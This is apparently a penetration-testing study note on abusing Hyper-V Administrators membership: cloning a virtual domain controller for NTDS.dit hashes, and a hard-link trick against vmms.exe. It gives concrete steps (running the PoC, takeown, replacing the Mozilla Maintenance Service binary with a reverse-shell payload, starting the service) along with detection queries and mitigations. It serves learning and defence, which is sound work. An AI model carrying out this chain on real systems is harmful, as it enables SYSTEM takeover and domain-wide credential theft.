# Hyper-V Administrators 

#hyperv #activedirectory #privesc #windows-security #domain-admin

---

## Overview
The **Hyper-V Administrators** group possesses full access to all Hyper-V features. This represents a significant privilege escalation path if exploited, as administrators of virtualized environments could easily become Domain Admins.

**Reference**: [Microsoft Hyper-V Administrators Group](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators)

---

## Key Attack Vectors

### 1. Virtual Domain Controller Exploitation

#### Threat Scenario
If Domain Controllers have been virtualized, virtualization admins should be considered **equivalent to Domain Admins**.

#### Attack Path
Hyper-V admins can:
1. Create a clone of the live Domain Controller
2. Mount the virtual disk offline
3. Extract the `NTDS.dit` file
4. Obtain NTLM password hashes for all domain users

**Impact**: Complete domain compromise

---

### 2. Hard Link Exploitation (Primary Attack Vector)

#### Technical Background
**Reference**: [Decoder Blog - From Hyper-V Admin to SYSTEM](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/)

#### Vulnerability Details
When deleting a virtual machine, `vmms.exe` (Virtual Machine Management Service) attempts to restore original file permissions on the corresponding `.vhdx` file.

**Key Flaw**: 
- `vmms.exe` restores permissions **as `NT AUTHORITY\SYSTEM`**
- Does NOT impersonate the user
- Allows arbitrary file write as SYSTEM

#### Attack Mechanism
1. Delete the `.vhdx` file
2. Create a native hard link pointing to a protected SYSTEM file
3. Attacker gains full permissions on the SYSTEM file

---

## Exploitation Techniques

### Prerequisites
- Hyper-V Administrator group membership
-  [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) or [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841) or
- SYSTEM-level service on server startable by unprivileged users

### Target File Example: Mozilla Maintenance Service

#### Affected Path
```
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

#### Why This Works
Firefox installs the `Mozilla Maintenance Service` which runs as SYSTEM and can be started by unprivileged users.

## Exploitation Steps

### Step 1: Deploy Hyper-V Hard Link PoC

#### Exploit Details
**Reference**: [Decoder-IT Hyper-V-admin-EOP GitHub](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1)

#### PowerShell Exploit
```powershell
# Hyper-V Hard Link Exploitation Script
# Modified to target Mozilla Maintenance Service

# This script:
# 1. Deletes the .vhdx file
# 2. Creates a hard link to C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
# 3. When vmms.exe restores permissions, we gain access to maintenanceservice.exe

# Execute the exploit (requires Hyper-V Admin privileges)
.\hyperv-eop.ps1 -TargetFile "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

**Expected Outcome**: Full permissions granted on maintenanceservice.exe

---

### Step 2: Take Ownership of the File

#### Command
```cmd
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

#### Output Example
```
SUCCESS: The file (or folder): "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe" now owned by user "DOMAIN\USER".
```

#### What This Does
- Transfers ownership from SYSTEM to current user
- Allows modification of the file

---

### Step 3: Replace with Malicious Binary

#### Preparation
1. Create a malicious `maintenanceservice.exe` payload
   - Can be a reverse shell, beacon, or backdoor
   - Use tools like `msfvenom` or custom C# executable

#### Deployment
```cmd
# Backup original (optional)
copy "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe" "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe.bak"

# Replace with malicious binary
copy malicious_maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

---

### Step 4: Start the Mozilla Maintenance Service

#### Command
```cmd
C:\htb> sc.exe start MozillaMaintenance
```

#### Expected Output
```
[SC] StartService SUCCESS
```

#### Result
- Malicious `maintenanceservice.exe` executes **as SYSTEM**
- Attacker gains SYSTEM-level code execution

## Defense & Detection

### Monitoring Strategies

#### 1. File System Monitoring
```powershell
# Monitor for hard link creation attempts
Get-WinEvent -LogName "Security" -FilterHashtable @{
    EventID = 4663  # File access event
    Path = "*Mozilla Maintenance Service*"
}
```

#### 2. Service Start Monitoring
```powershell
# Monitor MozillaMaintenance service starts
Get-WinEvent -LogName "System" -FilterHashtable @{
    EventID = 7036  # Service start event
    Message = "*MozillaMaintenance*"
}
```

#### 3. Hyper-V Admin Auditing
```powershell
# Monitor Hyper-V admin group membership changes
Get-WinEvent -LogName "Security" -FilterHashtable @{
    EventID = 4727  # Group created
} | Where-Object { $_.Properties[0].Value -match "Hyper-V" }
```

### Preventive Controls

| Control | Implementation | Effectiveness |
|---------|-----------------|-----------------|
| Least Privilege | Minimize Hyper-V admin assignments | High |
| Windows Updates | Apply patches beyond March 2020 | Critical |
| File Integrity Monitoring | Monitor critical service files | High |
| Service Permissions | Restrict service start privileges | Medium |
| Audit Logging | Enable detailed Security/System logging | Medium |

## Attack Timeline

```
Phase 1: Enumeration
├── Identify Hyper-V admin group members
├── Locate virtual machines
└── Identify target services (Firefox, etc.)

Phase 2: Exploitation
├── Delete .vhdx file
├── Create hard link to target file
├── Trigger vmms.exe permission reset
└── Gain file ownership

Phase 3: Execution
├── Replace target service binary
├── Start the service
└── Achieve SYSTEM privileges

Phase 4: Persistence
├── Create backdoor user account
├── Install persistence mechanisms
└── Maintain access as SYSTEM
```
